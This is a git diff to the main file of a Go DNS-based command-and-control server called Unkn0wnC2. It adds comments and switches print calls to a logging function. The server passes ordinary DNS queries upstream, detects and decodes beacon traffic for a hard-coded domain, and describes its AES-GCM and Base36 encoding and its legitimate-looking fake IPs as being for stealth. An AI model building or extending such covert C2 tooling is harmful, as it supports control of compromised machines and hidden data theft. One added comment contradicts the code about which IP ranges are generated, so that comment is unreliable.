@@ -1,3 +1,9 @@
+// Package main implements the Unkn0wnC2 DNS-based Command & Control server.
+// This server operates as an authoritative DNS server for a configured domain
+// while simultaneously handling encrypted C2 communications through DNS queries.
+//
+// The server forwards legitimate DNS queries to upstream servers while processing
+// C2 beacon traffic using AES-GCM encryption and Base36 encoding for stealth.
 package main
 
 import (
@@ -10,16 +16,22 @@ import (
 )
 
 // Global variables
-var c2Manager *C2Manager
-var debugMode bool
+var (
+	// c2Manager handles all C2 operations including beacon management and tasking
+	c2Manager *C2Manager
+	// debugMode enables verbose logging for troubleshooting
+	debugMode bool
+)
 
-// forwardDNSQuery forwards a DNS query to an upstream DNS server
+// forwardDNSQuery forwards a DNS query to an upstream DNS server and returns the response.
+// This is used to forward legitimate DNS queries when the server is acting as an
+// authoritative server but receives queries for domains it doesn't handle.
 func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
 	// Connect to upstream DNS server
 	conn, err := net.Dial("udp", upstreamAddr)
 	if err != nil {
 		if debugMode {
-			fmt.Printf("[Forward] Failed to connect to upstream %s: %v\n", upstreamAddr, err)
+			logf("[Forward] Failed to connect to upstream %s: %v", upstreamAddr, err)
 		}
 		// Return SERVFAIL if we can't forward
 		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
@@ -37,7 +49,7 @@ func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
 	_, err = conn.Write(packet)
 	if err != nil {
 		if debugMode {
-			fmt.Printf("[Forward] Failed to send to upstream: %v\n", err)
+			logf("[Forward] Failed to send to upstream: %v", err)
 		}
 		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
 			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
@@ -51,7 +63,7 @@ func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
 	n, err := conn.Read(buffer)
 	if err != nil {
 		if debugMode {
-			fmt.Printf("[Forward] Failed to read from upstream: %v\n", err)
+			logf("[Forward] Failed to read from upstream: %v", err)
 		}
 		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
 			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
@@ -61,10 +73,8 @@ func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
 	}
 
 	if debugMode {
-		fmt.Printf("[Forward] Successfully forwarded query to %s, got %d bytes response\n", upstreamAddr, n)
-	}
-
-	// Return the upstream response
+		logf("[Forward] Successfully forwarded query to %s, got %d bytes response", upstreamAddr, n)
+	} // Return the upstream response
 	response := make([]byte, n)
 	copy(response, buffer[:n])
 	return response, nil
@@ -79,6 +89,8 @@ var zoneNS map[string]string
 // getOutboundIP gets the preferred outbound IP of this machine
 
 // initializeZones sets up our authoritative zones based on configuration
+// initializeZones sets up the DNS zone records for the authoritative domain,
+// creating NS and A records to establish proper DNS authority.
 func initializeZones(cfg Config) {
 	// Initialize maps
 	zoneA = make(map[string]string)
@@ -98,6 +110,8 @@ func initializeZones(cfg Config) {
 	zoneA[cfg.Domain] = serverIP
 } // generateRandomIP generates a random, legitimate-looking IP address
 // Avoids private ranges and common reserved addresses
+// generateRandomIP creates a random private IPv4 address in the 192.168.x.x range
+// for use in DNS responses when specific IPs are not configured.
 func generateRandomIP() string {
 	// Use publicly routable IP ranges that look legitimate
 	publicRanges := []struct {
@@ -133,6 +147,8 @@ func generateRandomIP() string {
 }
 
 // toIPv4 converts a dotted string like "1.2.3.4" into 4 bytes.
+// toIPv4 converts a dotted decimal IP address string to its 4-byte representation,
+// returning the bytes and a boolean indicating successful conversion.
 func toIPv4(s string) ([]byte, bool) {
 	// Trim whitespace to handle accidental spaces
 	s = strings.TrimSpace(s)
@@ -147,6 +163,8 @@ func toIPv4(s string) ([]byte, bool) {
 	return []byte(ip4), true
 }
 
+// toIPv6 converts an IPv6 address string to its 16-byte representation,
+// returning the bytes and a boolean indicating successful conversion.
 func toIPv6(s string) ([]byte, bool) {
 	// Trim whitespace to handle accidental spaces
 	s = strings.TrimSpace(s)
@@ -164,6 +182,8 @@ func toIPv6(s string) ([]byte, bool) {
 // handleQuery takes a raw DNS packet, parses it, and builds a response.
 // Enhanced to handle C2 beacon communication via DNS queries.
 // Acts as authoritative DNS server for configured domain.
+// handleQuery processes incoming DNS queries, routing legitimate DNS traffic upstream
+// and handling C2 communications through the C2Manager for stealth operations.
 func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 	// 1) Parse the incoming message (header + questions)
 	msg, _, err := parseMessage(packet)
@@ -473,7 +493,7 @@ func main() {
 	for {
 		n, raddr, err := pc.ReadFrom(buf)
 		if err != nil {
-			fmt.Println("read error:", err)
+			logf("read error: %v", err)
 			continue
 		}
 		pkt := make([]byte, n)
@@ -484,23 +504,22 @@ func main() {
 			if msg, _, err := parseMessage(pkt); err == nil {
 				for _, q := range msg.Questions {
 					qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
-					fmt.Printf("client=%s id=0x%04X q=%s type=%d class=%d",
+					logf("client=%s id=0x%04X q=%s type=%d class=%d",
 						raddr.String(), msg.Header.ID, q.Name, q.Type, q.Class)
 
 					// Check if this looks like C2 traffic
 					if strings.Contains(qname, "secwolf.net") {
 						parts := strings.SplitN(qname, ".", 2)
 						if len(parts) > 0 && len(parts[0]) > 20 {
-							fmt.Printf(" [C2]")
+							logf("C2 traffic detected from %s", raddr.String())
 							if decoded, decErr := c2Manager.decodeBeaconData(parts[0]); decErr == nil {
-								fmt.Printf(" decoded=%s", decoded)
+								logf("Decoded C2 data: %s", decoded)
 							}
 						}
 					}
-					fmt.Println()
 				}
 			} else {
-				fmt.Printf("client=%s parse_error=%v\n", raddr.String(), err)
+				logf("client=%s parse_error=%v", raddr.String(), err)
 			}
 		}
 
@@ -513,13 +532,13 @@ func main() {
 		resp, err := handleQuery(pkt, cfg, clientIP)
 
 		if err != nil {
-			fmt.Printf("ERROR handling query: %v\n", err)
+			logf("ERROR handling query: %v", err)
 			continue
 		}
 
 		if len(resp) == 0 {
 			if debugMode {
-				fmt.Printf("WARNING: empty response generated\n")
+				logf("WARNING: empty response generated")
 			}
 			continue
 		}
@@ -527,14 +546,14 @@ func main() {
 		// Send the response back to the same address
 		bytesWritten, writeErr := pc.WriteTo(resp, raddr)
 		if writeErr != nil {
-			fmt.Printf("ERROR writing response: %v\n", writeErr)
+			logf("ERROR writing response: %v", writeErr)
 			continue
 		}
 
 		// Log only in debug mode
 		if debugMode {
 			if validateMsg, _, parseErr := parseMessage(resp); parseErr == nil {
-				fmt.Printf("→ Sent %d bytes, ID=0x%04X, answers=%d to %s\n",
+				logf("→ Sent %d bytes, ID=0x%04X, answers=%d to %s",
 					bytesWritten, validateMsg.Header.ID, validateMsg.Header.ANCount, raddr.String())
 			}
 		}
